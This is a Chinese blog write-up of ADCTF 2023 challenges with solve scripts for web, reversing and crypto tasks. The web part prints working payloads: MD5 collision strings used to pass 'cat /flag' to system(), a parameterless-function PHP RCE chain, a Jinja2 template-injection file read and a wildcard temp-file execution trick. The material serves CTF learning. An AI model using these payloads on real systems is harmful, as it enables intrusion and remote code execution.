---
title: ADCTF 2023
comments: true
date: 2023-11-20 19:14:34
tags:
  - CTF
categories:
  - 技术
---



不会的题以后用空在做（咕……

## Web

说实话并不怎么会web（

### checkin

base64：ZmxhZ3tJX2FtX2hlcmV9

#### flag

flag{I_am_here}

### begin_of_ctfer

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
extract($_GET);
extract($_POST);
if((string)$key1 !== (string)$key2 && md5($key1) == md5($key2) && md5($key3) == $key3){
    echo 'good ';
    if((string)$key4 !== (string)$key5 && md5($key4) === md5($key5)){
        echo "right ";
        if($a !== $b && md5($a) === md5($b) && sha1($a) === sha1($b)){
            echo "You are md5 master.This is your gift".$gift($secret);
        }
    }
}else{
    echo "Are you my master?";
}
```

分析程序，第一个弱比较用0e绕过，第二个用md5碰撞实现，第三个用数组绕过。然后执行`$gift`函数传参`$secret`，之前忘了这个一直以为有问题。另外数组经`md5`和`sha1`后值为`null`是php7及之前才有的特性，本地调试用php8会直接报错。

payload：

```
?key1=s878926199a&key2=s155964671a&key3=0e215962017&key4=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&key5=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&a[]=1&b[]=2&gift=system&secret=cat /flag
```

一些可以参考的：https://www.cnblogs.com/dre0m1/p/16062369.html

### ez_php

```php
<?php
if(isset($_GET['arr'])){
    $arr = $_GET['arr'];
    if ($arr[count($arr)-1]!==NULL&&end($arr)!==NULL) {
        if ($arr[count($arr)-1] !== end($arr)) {
            if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['cmd'])) {
                if(!preg_match('/show|get_defined_vars|headers|read|hex|current|end/i',$_GET['cmd'])){
                    eval($_GET['cmd']);
                }
            }
        }
    }
}else{
    highlight_file(__FILE__);
}
```

熟悉的无参数函数RCE，同时还加了几个判断,对于`arr`的判断，我也不知道为什么`arr[1]=1&arr[2]=2`就过了，然后下面的`cmd`屏蔽了`get_defined_var`和`headers`有点难受，于是就采用`array_rand`的方式随机出flag

payload：

```
?arr[1]=1&arr[2]=2&cmd=highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(dirname(dirname(getcwd())))))))));
```

### hard_ssti & hard_ssti_revenge

```python
from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(16)

@app.route('/')
def index():
    blacklist = ['\'','"','request','format',"chr","+"]
    s = request.args.get('payload')
    if s:
        for i in blacklist:
            if i in s.lower(): 
                return 'No!'
        return render_template_string(s)
    else:
        return open(__file__).read()
    
if __name__=='__main__':
    app.run(host='0.0.0.0',port=10001)
```

这题我看有os和file就直接写了。利用os获取flag文件名和文件目录，用os.path.join拼接，

payload：

```
{% set os=().__class__.__mro__[1].__subclasses__()[117].__init__.__globals__ %}
{% set flag_path=os.path.join(os.path.abspath(os.path.dirname(os.getcwd())),os.listdir(os.path.abspath(os.path.dirname(os.getcwd())))[19]) %}
{{().__class__.__mro__[1].__subclasses__()[424](flag_path).read()}}
```

### doyouknownrce

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
include('secret.php');
$error='你还想要secret嘛？';
$suces='既然你想要那给你吧！';
foreach($_GET as $key => $value){
    if($key==='error'){
        die("bad hack!");
    }
    $$key=$$value;
}foreach($_POST as $key => $value){
    if($value==='secret'){
        die("worse hack!!");
    }
    $$key=$$value;
}
if(!($_POST['secret']==$secret)){
    die($error);
}
echo "well done!".$secret."\n";
die($suces);
```

这里首先考了个简单的变量覆盖。通过params发送test=secret，POST body发送error=test，即可得到提示doyouknowRce.php

访问即可得到

```php
<?php
#you done it.Now try this!
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['cmd'])){
    $c=$_GET['cmd'];
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\~|\#|\:|\+|\-|\>|\</", $c)){
        system($c);
    }else echo 'nonono';
}
```

这里和ctfhshow的web55、56有点像，要利用POST产生的临时文件去执行，参考：https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html

但这里过滤了`-`，结束后经提醒直接把所有大写字母打上去就行，因此得到payload：

```
?cmd=. /???/????????[ABCDEFGHIJKLMNOPQRSTUVWXYZ]
```

然后使用Postman通过POST上传一个bash文件，`env`输出环境变量即可看到flag

### Lhander

发现存在www.zip，得到文件上传路径`/Admin-26E023E3-3BDD-AFB2-A59A-AD835FBE6E7C/`，然后不会了，但看代码总感觉哪里见过

### poppoppop

```php
<?php
class User {
    public $username;

    public function __construct($username) {
        $this->username = $username;
    }

    public function __toString() {
        return $this->username;
    }

    public function greet() {
        return "Hello, {$this->username}!";
    }

    public function __destruct() {
        echo "User object destructed: ".$this->username;
    }

}


class AnotherClass {
    public $info;

    public function __construct($info) {
        $this->info = $info;
    }

    public function __toString(){
        return ($this->info)();
    }
}

class SpecialClass {
    public $data;
    public $message;

    public function __construct($message) {
        $this->message = $message;
    }

    public function showMessage() {
        return $this->message;
    }

    public function __invoke(){
        return $this->showMessage()($this->data);  
    }
}

if (isset($_GET['data'])) {
    $data = $_GET['data'];
    $user = unserialize($data);
} else {
    highlight_file(__FILE__);
}
```

### ezz_php

```php
<?php
include('flag.php');
error_reporting(0);
highlight_file(__FILE__);

if(isset($_POST['f'])&&isset($_POST['g'])){
    $h=is_numeric($_POST['f']) and is_numeric(($_POST['g']));
    if($h){
        $g = (String)$_POST['g'];

        if(preg_match('/.+?welcomeu/is', $g)){
            die('bye!');
        }
        if(stripos($g,'ADwelcomeu') === FALSE){
            die('bye!!');
        }
    
    system("cat /flag");
    system("env");
    }
}
```

## Re

### Welcome

IDA<kbd>Ctrl</kbd>+<kbd>F12</kbd>查看字符串

#### flag

flag{Reverse_1s_C0ol!!Enjoy1ng_y0urs4lf!!}

### Peach

运行程序发现需要等待。通过IDA将地址`0x140003164`的10000000s修改为1s即可

#### flag

flag{Yep!!!Yep!!!Patch_1s_@_g00d_way_to_get_what_y0u_w4nt!!!!!!}

### EZpyre

使用pyinstxtractor解包，然后pycdc反编译

```python
# Source Generated with Decompyle++
# File: Ezpyre.pyc (Python 3.8)

encode = [70, 120, 80, 33, 74, 35, 121, 101, 118, 68, 43, 94, 112, 120, 80, 33, 74, 35, 80, 39, 115, 69, 39, 70, 118, 85, 87, 106, 95, 69, 68, 107]

def enc(input):
    for i in range(len(input)):
        if ord(input[i]) ^ 18 != encode[i]:
            return 0
    return 1

if __name__ == '__main__':
    print('Please input your flag:')
    flag = input()
    if len(flag) != 32:
        print('Length Wrong!!')
    elif enc(flag) == 1:
        print('Wow,you get it!!!')
        print('The flag is base64 to decode your input ')
    else:
        print('Sorry,Your input is wrong')
```

解题脚本：

```python
import base64
encode = [70, 120, 80, 33, 74, 35, 121, 101, 118, 68, 43, 94, 112, 120, 80, 33, 74, 35, 80, 39, 115, 69, 39, 70, 118, 85, 87, 106, 95, 69, 68, 107]
flag_b64 = ""
for i in encode:
    flag_b64 += chr(i^18)

flag = base64.b64decode(flag_b64)
print(flag)
```

#### flag

flag{N0w_Y0u_Kn0w_PyinSta11er}

### X0r

感觉像是RC4，不太确定（

地址`0x1400018B8`那里调用`0x1400016C4`和`0x14000179E`，前者对key进行处理，后者对用户输入处理，处理完后与encode进行比较

解题脚本：

```python
encode = [0xE8, 0x27, 0x3A, 0x33, 0x31, 0xE9, 0x3B, 0x96, 0x6E, 0xAC, 0x5C, 0x2D, 0x70, 0xBD, 0x10, 0xB0, 0x61, 0x29, 0xBB, 0xF0, 0xFA, 0xC4, 0xA4, 0xDB, 0xBE, 0xEB, 0x2E, 0x13, 0xA4, 0x34, 0x03, 0xD2, 0x76, 0x6B, 0xBC, 0xBF, 0x0F, 0xE6, 0xF0, 0x08, 0x08]
key = [0x57, 0x65, 0x6C, 0x43, 0x6F, 0x6D, 0x65, 0x21, 0x21, 0x21]
v3 = len(key)
v5 = []
v6 = 0
for i in range(256):
    v5.append(i)
for j in range(256):
    v6 = (v5[j] + 2*v6 + key[j % v3]) % 256
    v5[j], v5[v6] = v5[v6], v5[j]

v4_1 = 41
v5_1 = 0
v6_1 = 0
v7_1 = 0
output = []
while v5_1 < v4_1:
    v7_1 = (v7_1 + 1) % 256
    v6_1 = (v5[v7_1] + v6_1) % 256
    v5[v7_1], v5[v6_1] = v5[v6_1], v5[v7_1]
    output.append(v5[(v5[v7_1] + v5[v6_1]) % 256] ^ encode[v5_1])
    v5_1 += 1

for i in output:
    print(chr(i), end="")
```

#### flag

flag{Wowww!!You_Kn0W_the_Stream_C1pher!!}

### Flow

使用jadx解包，可见调用`flow`库。将`flow`库放入IDA反编译，查看check函数逻辑。先判断输入长度是否等于42，然后将传入字符串逐字符与key进行相应和或取反操作，最后与enc比较。

此处要注意so在加载时在`init_1`、`.init_proc`、`JNI_OnLoad`对key进行了操作。参考这篇文章https://www.cnblogs.com/bmjoker/p/11891123.html ，先进行`.init_proc`，再到`init_1`，最后才是`JNI_OnLoad`

解题脚本：

```python
enc = [0x39, 0x53, 0x76, 0xB0, 0x84, 0xA9, 0x40, 0xCF, 0x2E, 0x14, 0xC7, 0x28, 0x44, 0x72, 0x2E, 0xFB, 0xEA, 0x15, 0x72, 0x0B, 0x71, 0xEE, 0xA9, 0x72, 0x5E, 0x75, 0xB3, 0xC8, 0xB2, 0x44, 0xC7, 0x2A, 0x12, 0xC4, 0x2F, 0x44, 0x3A, 0x72, 0xFA, 0xBA, 0x43, 0x22]
key = 'flag{this_1s_fake_flag}'
key_num = [ord(i) for i in key]
for i in range(len(key_num)):
    key_num[i] = (key_num[i] * 114 + 2) % 256
    key_num[i] = key_num[i] ^ 0x20
    key_num[i] = key_num[i] | 0x17

key_len = len(key_num)

for i in range(42):
    for c in range(128):
        v4 = c
        v6 = v4 & ~key_num[i % key_len]
        v5 = c
        enc_c = v6 | key_num[i % key_len] & ~v5
        if enc_c == enc[i]:
            print(chr(c), end="")
            break
```

#### flag

flag{6781c073-9d5b-4f96-abd7-305e303eeee4}

### R4nea

TEA加密，没解出来，不知道哪里错了

### Grass

根据题目名以及无法直接IDA反编译可知是花指令。如图片所示，对所有相似结构的jnz跳转patch成nop，即可正常反编译。~~（晚上动态调试一步步标记才看出来）~~![flower](https://img.jks.moe/od/01tklsjzev2z3bpenelzezsqd676j5blh6)

得到一个标准的TEA加密

解题脚本：

```python
from Crypto.Util.number import long_to_bytes
enc = [0xA3EC1F29, 0xA97BC50B, 0xF209DB01, 0xBD8C48E3, 0x2141192A, 0x7748E1AC, 0x7D5A795D, 0x792084F2, 0x74BB8891, 0xBF921891, 0x3CEF4E51, 0x8A9DF2EB]
key = [0x00000001, 0x00000002, 0x00000003, 0x00000004]
v11 = 0x9E3779B9

def add(a, b):
    return (a + b) % (2**32)
def sub(a, b):
    return (a - b) % (2**32)

def left(a, b):
    return (a << b) % (2**32)

def right(a, b):
    return (a >> b) % (2**32)

for i in range(0, 12, 2):
    v15 = enc[i]
    v16 = enc[i + 1]
    v12 = 0xC6EF3720
    for j in range(32):
        v16 = sub(v16, add(key[3], right(v15, 5)) ^ add(v12, v15) ^ add(key[2], left(v15, 4)))
        v15 = sub(v15, add(key[1], right(v16, 5)) ^ add(v12, v16) ^ add(key[0], left(v16, 4)))
        v12 = sub(v12, v11)
    print(long_to_bytes(v15).decode()[::-1]+long_to_bytes(v16).decode()[::-1], end="")
```

#### flag

flag{Let's_H@ve_A_rest_And_Dr1nk_A_Cup_Of_tea!!}

### INSTALLER

跟上面 [EZpyre](#EZpyre)解题步骤相同，源程序：

```python
# Source Generated with Decompyle++
# File: ez_code.pyc (Python 3.8)

import base64
enc = b'Cg0GHCw4GFYAdmdHVgBoPVNULDpRRwomKxswOAIRKyscDTo5Cg0GRgBcfQ=='
flag = bytearray(input('Please Input Your flag:').encode())
for i in range(len(flag) - 1):
    flag[i] ^= flag[i + 1]
if enc == base64.b64encode(flag):
    print('Right!!')
else:
    print('Wrong!!')
```

解题脚本：

```python
import base64
enc = b'Cg0GHCw4GFYAdmdHVgBoPVNULDpRRwomKxswOAIRKyscDTo5Cg0GRgBcfQ=='
b64_dec_str = base64.b64decode(enc).decode()
dec_list = []
for i in range(len(b64_dec_str)):
    dec_list.append(ord(b64_dec_str[i]))
for i in range(len(dec_list)-1, 0, -1):
    dec_list[i-1] ^= dec_list[i]
for i in range(len(dec_list)):
    print(chr(dec_list[i]), end='')
```

#### flag

flag{Wow!!W0w!!It's_e4sy_to_get_the_flag!!}

### PACK

upx壳，脱壳后反编译得到简单的base64编码，码表都没换，base64：ZmxhZ3tCQHNlNjQmJlVQWF9BcmVfMW50ZXJlc3RMbmchIX0=

#### flag

flag{B@se64&&UPX_Are_1nterestLng!!}

### easy_enc

反编译，简单的异或

解题脚本：

```python
enc = [0x0A, 0x0D, 0x06, 0x1C, 0x2C, 0x32, 0x09, 0x2F, 0x2C, 0x02, 0x08, 0x3A, 0x2B, 0x1B, 0x30, 0x0D, 0x17, 0x1A, 0x08, 0x38, 0x1D, 0x1E, 0x08, 0x45, 0x00, 0x00, 0x68, 0x3D, 0x53, 0x54, 0x2C, 0x3A, 0x51, 0x47, 0x0A, 0x58, 0x68, 0x3A, 0x1D, 0x49, 0x53, 0x2B, 0x16, 0x3D, 0x4B, 0x00, 0x42, 0x7D]
for i in range(len(enc)-1, 0, -1):
    enc[i-1] ^= enc[i]
for c in enc:
    print(chr(c), end='')
```

#### flag

flag{WelCome_to_RE_World!!!It's_e4sy!Isn't_It??}

### Ezpython

题目：

```python
import base64
import hashlib
import sys

def abort():
    print("Wrong flag!")
    sys.exit(1)
print("Please input the flag:")
flag = input()
if len(flag) != 29:
    abort()
if flag[15]!='s' or flag[23]!='l':
    abort()
if flag[:5] != 'flag{':
    abort()
if sum(ord(x) * 100 ** i for i, x in enumerate(flag[18:23][::-1])) !=6812114848:
    abort()
if flag[16]!='0' or flag[17]!='_':
    abort()
if flag[14]!='_' or flag[25]!='_':
    abort()
if flag[14]!=flag[17]:
    abort()
if flag[28:] != '}':
    abort()
if base64.b64encode(flag[-4:].encode()) != b'XyEhfQ==':
    abort()
if (ord(flag[24])^0x36)!=90:
    abort()
if hashlib.md5(flag[9:3:-2].encode('utf-8')).hexdigest()!='313cbe1f770540ba8608222de9559a41':
    abort()
if hashlib.sha1((flag[6]+flag[8]+flag[10]).encode()).hexdigest()!= '8205169281506d630dcddfa8e89cd5f08bfc4c66':
    abort()
if hashlib.sha256(flag.encode()).hexdigest() != '06f00e5d1b8f2dd5bb4f5aeb2e2ef136fe24aa5de89bf90bbb8e5131d3b9f60e':
    abort()

print("You are right!")
```

简单暴力算一下就行

#### flag

flag{Pyth0n_1s_s0_Coo00ll_!!}

## Crypto

只做了基础的题目，就只贴脚本吧，网上基本上都能搜到

### Check Your Factor Database

factordb分解

```python
from Crypto.Util.number import *
import gmpy2

p = 102786970188634214370227829796268661753428191750544697648009912021832510479846406842660652442082773578020088104585096298944409097150001317920480815093132150004913448767202198299893840769568841219755466694275862843676241177608436424364735585247574303039353776987581503833128444693347920806395102183872665901277
q = 151606784799548610095916644217950865940397761353988655007201180031392776522565708552689972206548545357755036833336762542306291348158476176958083317845208464472445906639525228156065966245815886462442808969891370598247564766047649027653895495777728985622422940233924415769188183003695053034562331004932104400857
n = p * q
phi_n = (p - 1) * (q - 1)
e = 65537
c = 6371306651441414494898158050750379466411385075727176973777141489866804949152371066737700949957382328723739039588265348722939538409644758452741820636286764732056622302045805546424342834578149204912690500590371488794741154219116429974884626176276687505603436615961383352315424341433102202637442619829308641010524729990244179166911981814627661923080609365126766407039132426191716113002194884261389976932121106269022968620075855360220818974890016650718871530138072213210849868914955977855950213371455369372213479451425395072947888041803100826574552594123357214975040806204084524320510358181592274275785398054808107630303
d = gmpy2.invert(e, phi_n)
m = pow(c, d, n)
print(long_to_bytes(m))
```

#### flag

flag{factor_db_is_useful}

### Classical

key通过明文flag易知

```python
hex_str = 'a1a79ca2b69ea79caeaea49e9ca79a9ea4aba3a0ad9aa4ae9aa09caeb4b8'
for i in range(0, len(hex_str), 2):
    print(chr(int(hex_str[i:i+2], 16)-0x3b), end='')
```

#### flag

flag{classical_cipher_is_easy}

### One Key Pad

同上

```python
enc = 'e0eae7e1fde3e7fcffd9fee9f4fb'
key = 134
for i in range(0, len(enc), 2):
    print(chr(int(enc[i:i+2], 16)^key), end='')
```

#### flag

flag{eazy_xor}

### One Way Function

sha512暴力破解

```python
import hashlib
sha_list = []
for i in range(128):
    sha_list.append(hashlib.sha512(chr(i).encode()).hexdigest())

enc_list = ["711c22448e721e5491d8245b49425aa861f1fc4a15287f0735e203799b65cffec50b5abd0fddd91cd643aeb3b530d48f05e258e7e230a94ed5025c1387bb4e1b",
"f10127742e07a7705735572f823574b89aaf1cbe071935cb9e75e5cfeb817700cb484d1100a10ad5c32b59c3d6565211108aa9ef0611d7ec830c1b66f60e614d",
"1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75",
"19f142b018f307bfdf1c7009d15a29417c96d8678d2982eebce4961b2e67eeb118a8ebb1d75b70087c3e65bc793450e3fe4a10002befa2d038e5aed4796937f2",
"c2d03c6efb16c3f8064b0d059e45f951f1748421a622571a52009ddcc2a670851e1ad0269fbd81d45856fa20ffacd081dd20fece7611420befb49eb984bc23ca",
"48fb10b15f3d44a09dc82d02b06581e0c0c69478c9fd2cf8f9093659019a1687baecdbb38c9e72b12169dc4148690f87467f9154f5931c5df665c6496cbfd5f5",
"a321d8b405e3ef2604959847b36d171eebebc4a8941dc70a4784935a4fca5d5813de84dfa049f06549aa61b20848c1633ce81b675286ea8fb53db240d831c568",
"48fb10b15f3d44a09dc82d02b06581e0c0c69478c9fd2cf8f9093659019a1687baecdbb38c9e72b12169dc4148690f87467f9154f5931c5df665c6496cbfd5f5",
"31bca02094eb78126a517b206a88c73cfa9ec6f704c7030d18212cace820f025f00bf0ea68dbf3f3a5436ca63b53bf7bf80ad8d5de7d8359d0b7fed9dbc3ab99",
"f05210c5b4263f0ec4c3995bdab458d81d3953f354a9109520f159db1e8800bcd45b97c56dce90a1fc27ab03e0b8a9af8673747023c406299374116d6f966981",
"4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a",
"3bafbf08882a2d10133093a1b8433f50563b93c14acd05b79028eb1d12799027241450980651994501423a66c276ae26c43b739bc65c4e16b10c3af6c202aebb",
"3bafbf08882a2d10133093a1b8433f50563b93c14acd05b79028eb1d12799027241450980651994501423a66c276ae26c43b739bc65c4e16b10c3af6c202aebb",
"7c0b0d99a6e4c33cda0f6f63547f878f4dd9f486dfe5d0446ce004b1c0ff28f191ff86f5d5933d3614cceee6fbbdc17e658881d3a164dfa5d6f4c699b2126e3d",
"48fb10b15f3d44a09dc82d02b06581e0c0c69478c9fd2cf8f9093659019a1687baecdbb38c9e72b12169dc4148690f87467f9154f5931c5df665c6496cbfd5f5",
"3c9ad55147a7144f6067327c3b82ea70e7c5426add9ceea4d07dc2902239bf9e049b88625eb65d014a7718f79354608cab0921782c643f0208983fffa3582e40",
"5267768822ee624d48fce15ec5ca79cbd602cb7f4c2157a516556991f22ef8c7b5ef7b18d1ff41c59370efb0858651d44a936c11b7b144c48fe04df3c6a3e8da",
"5267768822ee624d48fce15ec5ca79cbd602cb7f4c2157a516556991f22ef8c7b5ef7b18d1ff41c59370efb0858651d44a936c11b7b144c48fe04df3c6a3e8da",
"7c0b0d99a6e4c33cda0f6f63547f878f4dd9f486dfe5d0446ce004b1c0ff28f191ff86f5d5933d3614cceee6fbbdc17e658881d3a164dfa5d6f4c699b2126e3d",
"a321d8b405e3ef2604959847b36d171eebebc4a8941dc70a4784935a4fca5d5813de84dfa049f06549aa61b20848c1633ce81b675286ea8fb53db240d831c568",
"1f40fc92da241694750979ee6cf582f2d5d7d28e18335de05abc54d0560e0f5302860c652bf08d560252aa5e74210546f369fbbbce8c12cfc7957b2652fe9a75",
"48fb10b15f3d44a09dc82d02b06581e0c0c69478c9fd2cf8f9093659019a1687baecdbb38c9e72b12169dc4148690f87467f9154f5931c5df665c6496cbfd5f5",
"48fb10b15f3d44a09dc82d02b06581e0c0c69478c9fd2cf8f9093659019a1687baecdbb38c9e72b12169dc4148690f87467f9154f5931c5df665c6496cbfd5f5",
"7c0b0d99a6e4c33cda0f6f63547f878f4dd9f486dfe5d0446ce004b1c0ff28f191ff86f5d5933d3614cceee6fbbdc17e658881d3a164dfa5d6f4c699b2126e3d",
"5267768822ee624d48fce15ec5ca79cbd602cb7f4c2157a516556991f22ef8c7b5ef7b18d1ff41c59370efb0858651d44a936c11b7b144c48fe04df3c6a3e8da",
"4dff4ea340f0a823f15d3f4f01ab62eae0e5da579ccb851f8db9dfe84c58b2b37b89903a740e1ee172da793a6e79d560e5f7f9bd058a12a280433ed6fa46510a",
"0dc526d8c4fa04084f4b2a6433f4cd14664b93df9fb8a9e00b77ba890b83704d24944c93caa692b51085bb476f81852c27e793600f137ae3929018cd4c8f1a45",
"a321d8b405e3ef2604959847b36d171eebebc4a8941dc70a4784935a4fca5d5813de84dfa049f06549aa61b20848c1633ce81b675286ea8fb53db240d831c568",
"7c0b0d99a6e4c33cda0f6f63547f878f4dd9f486dfe5d0446ce004b1c0ff28f191ff86f5d5933d3614cceee6fbbdc17e658881d3a164dfa5d6f4c699b2126e3d",
"bc23b8b01772d2dd67efb8fe1a5e6bd0f44b97c36101be6cc09f253b53e68d67a22e4643068dfd1341980134ea57570acf65e306e4d96cef4d560384894c88a4",
"acc28db2beb7b42baa1cb0243d401ccb4e3fce44d7b02879a52799aadff541522d8822598b2fa664f9d5156c00c924805d75c3868bd56c2acb81d37e98e35adc",
"bc23b8b01772d2dd67efb8fe1a5e6bd0f44b97c36101be6cc09f253b53e68d67a22e4643068dfd1341980134ea57570acf65e306e4d96cef4d560384894c88a4",
"87c568e037a5fa50b1bc911e8ee19a77c4dd3c22bce9932f86fdd8a216afe1681c89737fada6859e91047eece711ec16da62d6ccb9fd0de2c51f132347350d8c",
"87c568e037a5fa50b1bc911e8ee19a77c4dd3c22bce9932f86fdd8a216afe1681c89737fada6859e91047eece711ec16da62d6ccb9fd0de2c51f132347350d8c",
"acc28db2beb7b42baa1cb0243d401ccb4e3fce44d7b02879a52799aadff541522d8822598b2fa664f9d5156c00c924805d75c3868bd56c2acb81d37e98e35adc",
"a321d8b405e3ef2604959847b36d171eebebc4a8941dc70a4784935a4fca5d5813de84dfa049f06549aa61b20848c1633ce81b675286ea8fb53db240d831c568",
"5267768822ee624d48fce15ec5ca79cbd602cb7f4c2157a516556991f22ef8c7b5ef7b18d1ff41c59370efb0858651d44a936c11b7b144c48fe04df3c6a3e8da",
"5267768822ee624d48fce15ec5ca79cbd602cb7f4c2157a516556991f22ef8c7b5ef7b18d1ff41c59370efb0858651d44a936c11b7b144c48fe04df3c6a3e8da",
"3bafbf08882a2d10133093a1b8433f50563b93c14acd05b79028eb1d12799027241450980651994501423a66c276ae26c43b739bc65c4e16b10c3af6c202aebb",
"3bafbf08882a2d10133093a1b8433f50563b93c14acd05b79028eb1d12799027241450980651994501423a66c276ae26c43b739bc65c4e16b10c3af6c202aebb",
"711c22448e721e5491d8245b49425aa861f1fc4a15287f0735e203799b65cffec50b5abd0fddd91cd643aeb3b530d48f05e258e7e230a94ed5025c1387bb4e1b",
"9220b9865a97d2eb9cad34271703f7c8e61cbe63a7a87d2aa3783f23669f14184eacda9a446f6c2f37e25426ec89542fdc9d8186fb5a8845e29896f920f9f1e3"
]

for i in enc_list:
    for j in sha_list:
        if i == j:
            print(chr(sha_list.index(j)),end='')
            break
```

#### flag

flag{d4d07133-d6bb-4add-b194-8c8eec4bb33f}

### Small Private Key

如题目名

```python
from Crypto.Util.number import *
import gmpy2


def continuedFra(x, y):
    """计算连分数
    :param x: 分子
    :param y: 分母
    :return: 连分数列表
    """
    cf = []
    while y:
        cf.append(x // y)
        x, y = y, x % y
    return cf


def gradualFra(cf):
    """计算传入列表最后的渐进分数
    :param cf: 连分数列表
    :return: 该列表最后的渐近分数
    """
    numerator = 0
    denominator = 1
    for x in cf[::-1]:
        # 这里的渐进分数分子分母要分开
        numerator, denominator = denominator, x * denominator + numerator
    return numerator, denominator


def solve_pq(a, b, c):
    """使用韦达定理解出pq，x^2−(p+q)∗x+pq=0
    :param a:x^2的系数
    :param b:x的系数
    :param c:pq
    :return:p，q
    """
    par = gmpy2.isqrt(b * b - 4 * a * c)
    return (-b + par) // (2 * a), (-b - par) // (2 * a)


def getGradualFra(cf):
    """计算列表所有的渐近分数
    :param cf: 连分数列表
    :return: 该列表所有的渐近分数
    """
    gf = []
    for i in range(1, len(cf) + 1):
        gf.append(gradualFra(cf[:i]))
    return gf


def wienerAttack(e, n):
    """
    :param e:
    :param n:
    :return: 私钥d
    """
    cf = continuedFra(e, n)
    gf = getGradualFra(cf)
    for d, k in gf:
        if k == 0: continue
        if (e * d - 1) % k != 0:
            continue
        phi = (e * d - 1) // k
        p, q = solve_pq(1, n - phi + 1, n)
        if p * q == n:
            return d


n = 25034940371316027982989109858983035957022242853528396205204302689129321135889179548531825126324862877304349959759457473345386677350801699694519801854694564609540518859226257541735101131061153801691285166414857623323949567961732640461064080037163533593808704618894050793617912645403825144607485529156629512886933846375308246214691525742555371476243960391699031713932843895792714199373152269986560227086948393910675760719168290941887562375917844785381936574415210321959842546803738925021869606843612617039943708419736652460467627506212136153024123735359863652531815458080035602542612800065576703132829747202040715495261
e = 8476564611150469550940127648995203426181865094246078454643881948809381443584793139382653113711164309772437111491351998573447193571064858150363104387115649306393902238338219700119763022685799953771599909005121420990063342272563907081327771977206070476743513032065564699999670422672158101425375379506012471494353700503102697115841770403551038153848176736896358340411157551866574081672026813318046629404731548134518258622524050396360074692461505095852899650864748923429693383917296734088995166126930527701686831547485249173697786028781162569722181598560086284336947191515403554973114951132921661316740670097246644621235
c = 2454907297028787136541170385686610861622971578077914006379129694488677204476052661898180367388312812417750676632466512790338753011526338881849303131344257007679563941135578225050180073435144846362258162994482049100964524471580613044367097509971544861215748305549133024033487527716753095794133627812956111512512284550065787294808607985520648752183114793040765129106295569341461971506957453926291242028663915032518573276483507492371321759598920056701036342948600999993824607775771236978973118279060517862410982414208929888882846456223219663454145617549917909512888434422795187741858097201015892992321357332815756686070
d = wienerAttack(e, n)
m = pow(c, d, n)
print(long_to_bytes(m))
```

#### flag

flag{8aea3705-6869-4268-bbe6-88a0af76e133}

### Too Close To Sqrt

```python
from gmpy2 import *
from Crypto.Util.number import *

n = 77110253337392483710762885851693115398718726693715564954496625571775664359421696802771127484396119363821442323280817855193791448966346325672454247192244603281463595140923987182065095198239715749980911991399313395478292871386248479783966672279960117003211050451721307589036878362258617072298763845707881171743025954660306653186069633961424298647787491228085801739935823867940079473418881721402983930102278146132444200918211570297746753023639071980907968315022004518691979622641358951345391364430806558132988012728594904676117146959007388204192026655365596585273466096578234688721967922267682066710965927143418418189061
c = 702169486130185630321527556026041034472676838451810139529487621183247331904842057079283224928768517113408797087181581480998121028501323357655408002432408893862758626561073997320904805861882437888050151254177440453995235705432462544064680391673889537055043464482935772971360736797960328738609078425683870759310570638726605063168459207781397030244493359714270821300687562579988959673816634095712866030123140597773571541522765682883740928146364852979096568241392987132397744676804445290807040450917391600712817423804313823998912230965373385456071776639302417042258135008463458352605827748674554004125037538659993074220

q = next_prime(iroot(n, 2)[0])
assert n % q == 0
p = n // q
d = invert(0x10001, (p-1)*(q-1))
m = pow(c,d,n)
print(long_to_bytes(m))
```

#### flag

flag{oops_the_N_is_not_secure}

### Use Many Time

```python
from Crypto.Util.number import *
import gmpy2

p = 22826089215015062971239747479765573980261860956508924966887672339011131256071593933855569627345730491900186620681430083447450449800363453742460910559038500884300216627993746389795089330113851499728923389157896774203901873995580499872010382271176165914123608852269645266420541883312655519483268190334714005528424143016351241964111694448438696041108115955227931375862495974220469117197567953528127044121313985354817794430503700199549401649666484648419628490258677717450705269977839872907619635351260327914403045603763386492257545870697934887022012834074741429555229113461953163363204273114559929014526316520808246516691
n = p ** 4
c = 26295940992890194294635696728271568598840271752572299841307319955234419456981546267520872731735606903814347688778534972907415241546856130504371956404444353494367846169119411281982900994201592821713866944006805519867862622816909520970008485790389995203249385931279813483012784783609048333942148801331818452101894260265885967492314387004187048741511926161585199153253460657268537108789217518766973583717380290170724325947823112724654749800386153187271213939922044546563313040104303823618947025037527509253767713607646552327809313525419432121211673123746379493034708000599412986001881852919027574030882941188785349605500591424575789073045509689575985103307048326901090800676290232185683757853925715469750486692366715583556866710001155941719429703654674510272288838281064578859340582229766577107907011091256049420933491453355830938785385166423564663434255073956656402770938761163508401047698860266567927409231270198949854848545283376613112030721243458389580038936115817762020465647929438383848896138469676000496555583272970657444581548528633717759133486498532320396245281682310940129260068629064575370331828522385137349468734133200967398512847261848995137744900431497607506108981243570655239343621495700458952490630728797858099155097421793867810987959286981660750202600725228847532747245128708269774114032450960663146505016046264404770706368722139087412912209423533921383685833114537965869374576598996309453257928578646537897180049760644396918714124137188441740940039355487567667069377212422796778708724997017612336089892512332383355362951694018027305247284424518859697249717140797253793608005459430601680078206760913423941068054908303372769277611262814486950329958665589823107977357922733032715983820065220360043514033558594387111052366777459772380